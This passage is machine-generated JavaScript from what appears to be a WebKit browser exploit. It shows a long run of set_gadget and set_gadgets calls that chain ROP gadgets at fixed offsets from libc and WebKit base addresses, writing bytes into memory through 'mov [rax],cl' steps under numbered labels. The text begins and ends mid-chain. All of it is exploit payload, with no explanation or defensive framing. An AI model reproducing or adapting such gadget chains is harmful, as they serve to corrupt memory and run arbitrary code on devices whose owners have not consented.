set_gadget(libc_base+768796,);
//L4445:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+262336,//L4447
webkit_base+4687784,
libc_base+713278
]);
//L4446:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4447:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+262408,//L4449
webkit_base+4687784,
libc_base+713278
]);
//L4448:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4449:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+262480,//L4451
webkit_base+4687784,
libc_base+713278
]);
//L4450:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4451:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+262552,//L4453
webkit_base+4687784,
libc_base+713278
]);
//L4452:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4453:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+262624,//L4455
webkit_base+4687784,
libc_base+713278
]);
//L4454:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4455:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+262696,//L4457
webkit_base+4687784,
libc_base+713278
]);
//L4456:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4457:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+262768,//L4459
webkit_base+4687784,
libc_base+713278
]);
//L4458:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4459:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+262840,//L4461
webkit_base+4687784,
libc_base+713278
]);
//L4460:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4461:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+262912,//L4463
webkit_base+4687784,
libc_base+713278
]);
//L4462:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4463:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+262984,//L4465
webkit_base+4687784,
libc_base+713278
]);
//L4464:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4465:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+263056,//L4467
webkit_base+4687784,
libc_base+713278
]);
//L4466:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4467:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+263128,//L4469
webkit_base+4687784,
libc_base+713278
]);
//L4468:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4469:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+263200,//L4471
webkit_base+4687784,
libc_base+713278
]);
//L4470:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4471:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+263272,//L4473
webkit_base+4687784,
libc_base+713278
]);
//L4472:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4473:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+263344,//L4475
webkit_base+4687784,
libc_base+713278
]);
//L4474:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4475:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+263416,//L4477
webkit_base+4687784,
libc_base+713278
]);
//L4476:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4477:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+263488,//L4479
webkit_base+4687784,
libc_base+713278
]);
//L4478:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4479:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+263560,//L4481
webkit_base+4687784,
libc_base+713278
]);
//L4480:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4481:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+263632,//L4483
webkit_base+4687784,
libc_base+713278
]);
//L4482:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4483:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+263704,//L4485
webkit_base+4687784,
libc_base+713278
]);
//L4484:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4485:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+263776,//L4487
webkit_base+4687784,
libc_base+713278
]);
//L4486:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4487:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+263848,//L4489
webkit_base+4687784,
libc_base+713278
]);
//L4488:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4489:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+263920,//L4491
webkit_base+4687784,
libc_base+713278
]);
//L4490:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4491:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+263992,//L4493
webkit_base+4687784,
libc_base+713278
]);
//L4492:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4493:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+264064,//L4495
webkit_base+4687784,
libc_base+713278
]);
//L4494:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4495:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+264136,//L4497
webkit_base+4687784,
libc_base+713278
]);
//L4496:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4497:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+264208,//L4499
webkit_base+4687784,
libc_base+713278
]);
//L4498:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4499:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+264280,//L4501
webkit_base+4687784,
libc_base+713278
]);
//L4500:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4501:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+264352,//L4503
webkit_base+4687784,
libc_base+713278
]);
//L4502:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4503:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+264424,//L4505
webkit_base+4687784,
libc_base+713278
]);
//L4504:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4505:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+264496,//L4507
webkit_base+4687784,
libc_base+713278
]);
//L4506:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4507:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+264568,//L4509
webkit_base+4687784,
libc_base+713278
]);
//L4508:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4509:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+264640,//L4511
webkit_base+4687784,
libc_base+713278
]);
//L4510:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4511:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+264712,//L4513
webkit_base+4687784,
libc_base+713278
]);
//L4512:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4513:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+264784,//L4515
webkit_base+4687784,
libc_base+713278
]);
//L4514:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4515:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+264856,//L4517
webkit_base+4687784,
libc_base+713278
]);
//L4516:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4517:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+264928,//L4519
webkit_base+4687784,
libc_base+713278
]);
//L4518:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4519:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+265000,//L4521
webkit_base+4687784,
libc_base+713278
]);
//L4520:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4521:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+265072,//L4523
webkit_base+4687784,
libc_base+713278
]);
//L4522:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4523:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+265144,//L4525
webkit_base+4687784,
libc_base+713278
]);
//L4524:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4525:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+265216,//L4527
webkit_base+4687784,
libc_base+713278
]);
//L4526:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4527:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+265288,//L4529
webkit_base+4687784,
libc_base+713278
]);
//L4528:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4529:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+265360,//L4531
webkit_base+4687784,
libc_base+713278
]);
//L4530:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4531:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+265432,//L4533
webkit_base+4687784,
libc_base+713278
]);
//L4532:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4533:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+265504,//L4535
webkit_base+4687784,
libc_base+713278
]);
//L4534:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4535:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+265576,//L4537
webkit_base+4687784,
libc_base+713278
]);
//L4536:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4537:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+265648,//L4539
webkit_base+4687784,
libc_base+713278
]);
//L4538:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4539:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+265720,//L4541
webkit_base+4687784,
libc_base+713278
]);
//L4540:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4541:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+265792,//L4543
webkit_base+4687784,
libc_base+713278
]);
//L4542:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4543:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+265864,//L4545
webkit_base+4687784,
libc_base+713278
]);
//L4544:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4545:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+265936,//L4547
webkit_base+4687784,
libc_base+713278
]);
//L4546:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4547:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+266008,//L4549
webkit_base+4687784,
libc_base+713278
]);
//L4548:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4549:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+266080,//L4551
webkit_base+4687784,
libc_base+713278
]);
//L4550:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4551:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+266152,//L4553
webkit_base+4687784,
libc_base+713278
]);
//L4552:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4553:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+266224,//L4555
webkit_base+4687784,
libc_base+713278
]);
//L4554:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4555:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+266296,//L4557
webkit_base+4687784,
libc_base+713278
]);
//L4556:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4557:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+266368,//L4559
webkit_base+4687784,
libc_base+713278
]);
//L4558:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4559:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+266440,//L4561
webkit_base+4687784,
libc_base+713278
]);
//L4560:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4561:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+266512,//L4563
webkit_base+4687784,
libc_base+713278
]);
//L4562:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4563:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+266584,//L4565
webkit_base+4687784,
libc_base+713278
]);
//L4564:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4565:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+266656,//L4567
webkit_base+4687784,
libc_base+713278
]);
//L4566:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4567:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+266728,//L4569
webkit_base+4687784,
libc_base+713278
]);
//L4568:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4569:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+266800,//L4571
webkit_base+4687784,
libc_base+713278
]);
//L4570:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4571:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+266872,//L4573
webkit_base+4687784,
libc_base+713278
]);
//L4572:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4573:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+266944,//L4575
webkit_base+4687784,
libc_base+713278
]);
//L4574:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4575:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+267016,//L4577
webkit_base+4687784,
libc_base+713278
]);
//L4576:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4577:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+267088,//L4579
webkit_base+4687784,
libc_base+713278
]);
//L4578:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4579:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+267160,//L4581
webkit_base+4687784,
libc_base+713278
]);
//L4580:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4581:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+267232,//L4583
webkit_base+4687784,
libc_base+713278
]);
//L4582:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4583:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+267304,//L4585
webkit_base+4687784,
libc_base+713278
]);
//L4584:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4585:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+267376,//L4587
webkit_base+4687784,
libc_base+713278
]);
//L4586:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4587:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+267448,//L4589
webkit_base+4687784,
libc_base+713278
]);
//L4588:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4589:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+267520,//L4591
webkit_base+4687784,
libc_base+713278
]);
//L4590:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4591:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+267592,//L4593
webkit_base+4687784,
libc_base+713278
]);
//L4592:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4593:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+267664,//L4595
webkit_base+4687784,
libc_base+713278
]);
//L4594:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4595:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+267736,//L4597
webkit_base+4687784,
libc_base+713278
]);
//L4596:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4597:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+267808,//L4599
webkit_base+4687784,
libc_base+713278
]);
//L4598:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4599:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+267880,//L4601
webkit_base+4687784,
libc_base+713278
]);
//L4600:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4601:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+267952,//L4603
webkit_base+4687784,
libc_base+713278
]);
//L4602:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4603:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+268024,//L4605
webkit_base+4687784,
libc_base+713278
]);
//L4604:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4605:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+268096,//L4607
webkit_base+4687784,
libc_base+713278
]);
//L4606:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4607:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+268168,//L4609
webkit_base+4687784,
libc_base+713278
]);
//L4608:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4609:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+268240,//L4611
webkit_base+4687784,
libc_base+713278
]);
//L4610:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4611:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+268312,//L4613
webkit_base+4687784,
libc_base+713278
]);
//L4612:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4613:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+268384,//L4615
webkit_base+4687784,
libc_base+713278
]);
//L4614:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4615:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+268456,//L4617
webkit_base+4687784,
libc_base+713278
]);
//L4616:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4617:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+268528,//L4619
webkit_base+4687784,
libc_base+713278
]);
//L4618:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4619:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+268600,//L4621
webkit_base+4687784,
libc_base+713278
]);
//L4620:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4621:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+268672,//L4623
webkit_base+4687784,
libc_base+713278
]);
//L4622:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4623:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+268744,//L4625
webkit_base+4687784,
libc_base+713278
]);
//L4624:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4625:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+268816,//L4627
webkit_base+4687784,
libc_base+713278
]);
//L4626:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4627:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+268888,//L4629
webkit_base+4687784,
libc_base+713278
]);
//L4628:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4629:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+268960,//L4631
webkit_base+4687784,
libc_base+713278
]);
//L4630:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4631:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+269032,//L4633
webkit_base+4687784,
libc_base+713278
]);
//L4632:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4633:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+269104,//L4635
webkit_base+4687784,
libc_base+713278
]);
//L4634:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4635:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+269176,//L4637
webkit_base+4687784,
libc_base+713278
]);
//L4636:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4637:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+269248,//L4639
webkit_base+4687784,
libc_base+713278
]);
//L4638:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4639:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+269320,//L4641
webkit_base+4687784,
libc_base+713278
]);
//L4640:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4641:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+269392,//L4643
webkit_base+4687784,
libc_base+713278
]);
//L4642:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4643:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+269464,//L4645
webkit_base+4687784,
libc_base+713278
]);
//L4644:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4645:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+269536,//L4647
webkit_base+4687784,
libc_base+713278
]);
//L4646:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4647:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+269608,//L4649
webkit_base+4687784,
libc_base+713278
]);
//L4648:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4649:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+269680,//L4651
webkit_base+4687784,
libc_base+713278
]);
//L4650:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4651:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+269752,//L4653
webkit_base+4687784,
libc_base+713278
]);
//L4652:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4653:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+269824,//L4655
webkit_base+4687784,
libc_base+713278
]);
//L4654:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4655:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+269896,//L4657
webkit_base+4687784,
libc_base+713278
]);
//L4656:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4657:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+269968,//L4659
webkit_base+4687784,
libc_base+713278
]);
//L4658:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4659:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+270040,//L4661
webkit_base+4687784,
libc_base+713278
]);
//L4660:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4661:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+270112,//L4663
webkit_base+4687784,
libc_base+713278
]);
//L4662:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4663:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
